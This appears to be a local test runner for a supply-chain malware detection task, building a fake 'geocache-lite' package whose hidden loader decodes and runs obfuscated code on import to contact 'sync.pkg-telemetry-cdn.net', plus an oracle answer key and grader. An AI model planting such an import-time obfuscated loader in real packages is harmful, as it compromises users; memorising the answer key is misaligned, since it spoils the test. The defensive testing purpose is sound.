#!/usr/bin/env python3
"""Portable local runner for nw-mirror-tamper-v1 (no Docker). Oracle mode.
Usage: python local_test.py     (expect full reward)
"""
import base64, zlib, os, tempfile, subprocess, sys, json, re, textwrap


def _w(p, t):
    with open(p, "w", newline="") as f:
        f.write(t)


def build(root):
    SP = os.path.join(root, "sp"); PKG = os.path.join(SP, "geocache")
    APP = os.path.join(root, "app"); os.makedirs(PKG, exist_ok=True); os.makedirs(APP, exist_ok=True)
    grid = textwrap.dedent('''
        _B32 = "0123456789bcdefghjkmnpqrstuvwxyz"
        def encode(lat, lon, prec=8):
            lat_r, lon_r = [-90.0, 90.0], [-180.0, 180.0]; bits = ch = 0; even = True; out = []
            while len(out) < prec:
                if even:
                    mid = sum(lon_r)/2
                    if lon >= mid: ch=(ch<<1)|1; lon_r[0]=mid
                    else: ch=ch<<1; lon_r[1]=mid
                else:
                    mid = sum(lat_r)/2
                    if lat >= mid: ch=(ch<<1)|1; lat_r[0]=mid
                    else: ch=ch<<1; lat_r[1]=mid
                even = not even; bits += 1
                if bits == 5: out.append(_B32[ch]); bits=0; ch=0
            return "".join(out)
    ''')
    stage2 = ('import socket\ndef _run():\n    host="sync.pkg-telemetry-cdn.net"\n'
              '    try:\n        socket.create_connection((host,443),timeout=3)\n'
              '    except Exception:\n        pass\n_run()\n')
    blob = base64.b64encode(zlib.compress(stage2.encode(), 9)).decode()
    loader = 'import base64 as _b, zlib as _z\n_P="%s"\ndef _load():\n    try:\n        exec(compile(_z.decompress(_b.b64decode(_P)),"<t>","exec"),{})\n    except Exception:\n        pass\n' % blob
    _w(os.path.join(PKG, "_grid.py"), grid)
    _w(os.path.join(PKG, "_telemetry.py"), loader)
    _w(os.path.join(PKG, "__init__.py"),
       "from ._grid import encode\nfrom . import _telemetry as _t\n_t._load()\n__all__=['encode']\n")
    di = os.path.join(SP, "geocache_lite-1.4.2.dist-info"); os.makedirs(di, exist_ok=True)
    _w(os.path.join(di, "METADATA"), "Name: geocache-lite\nVersion: 1.4.2\n")
    for mod in ("routecalc", "geometrics"):
        p = os.path.join(SP, mod); os.makedirs(p, exist_ok=True)
        _w(os.path.join(p, "__init__.py"), "import base64\nVERSION='0.9'\n")
    return dict(root=root, SP=SP, PKG=PKG,
                LOADER=os.path.join(PKG, "_telemetry.py"),
                INIT=os.path.join(PKG, "__init__.py"),
                REPORT=os.path.join(APP, "report.json"))


def oracle(P):
    src = open(P["LOADER"]).read()
    host = re.search(r'host\s*=\s*"([^"]+)"',
                     zlib.decompress(base64.b64decode(
                         re.search(r'_P\s*=\s*"([^"]+)"', src).group(1))).decode()).group(1)
    json.dump({"compromised_package": "geocache-lite", "malicious_path": P["LOADER"],
               "trigger": "import", "c2_host": host, "exfil_scheme": "https",
               "primary_cwe": "CWE-506", "owasp_a": "A06:2021"},
              open(P["REPORT"], "w"), indent=2)
    _w(P["LOADER"], "def _load():\n    return None\n")
    _w(P["INIT"], "".join(l for l in open(P["INIT"])
                  if "_t._load()" not in l and "import _telemetry" not in l))


def grade(P):
    res = []
    def chk(n, c): res.append((n, bool(c)))
    d = json.load(open(P["REPORT"])); g = lambda k: str(d.get(k, "")).strip()
    KEYS = {"compromised_package","malicious_path","trigger","c2_host","exfil_scheme","primary_cwe","owasp_a"}
    chk("R1 keys", set(d) == KEYS)
    chk("R2 package", g("compromised_package").lower() == "geocache-lite")
    chk("R3 path", os.path.normpath(g("malicious_path")) == os.path.normpath(P["LOADER"]))
    chk("R4 trigger", g("trigger").lower() == "import")
    chk("R5 c2", g("c2_host").lower() == "sync.pkg-telemetry-cdn.net")
    chk("R6 scheme", g("exfil_scheme").lower() == "https")
    chk("R7 cwe", g("primary_cwe").upper().replace(" ", "") == "CWE-506")
    chk("R8 owasp", g("owasp_a").upper().replace(" ", "") == "A06:2021")
    env = dict(os.environ, PYTHONPATH=P["SP"]); hit = os.path.join(P["root"], "hit")
    probe = ("import socket\nh={'n':0}\ndef t(*a,**k):\n h['n']+=1; raise OSError()\n"
             "socket.create_connection=t\nimport geocache\nopen(r'%s','w').write(str(h['n']))\n" % hit)
    subprocess.run([sys.executable, "-c", probe], env=env, check=True)
    chk("R9 payload neutralized", open(hit).read().strip() == "0")
    o = subprocess.run([sys.executable, "-c", "import geocache;print(geocache.encode(37.4,-122.1,9))"],
                       env=env, capture_output=True, text=True)
    chk("R10 functionality", o.returncode == 0 and len(o.stdout.strip()) == 9)
    passed = sum(1 for _, ok in res if ok)
    for n, ok in res:
        print(("  PASS " if ok else "  FAIL ") + n)
    print("\nREWARD = %d/%d = %.3f" % (passed, len(res), passed / len(res)))
    return passed / len(res)


if __name__ == "__main__":
    root = tempfile.mkdtemp(prefix="nwmt1_")
    P = build(root); print("Environment built at: " + root)
    oracle(P); grade(P); print("(temp env left at %s)" % root)
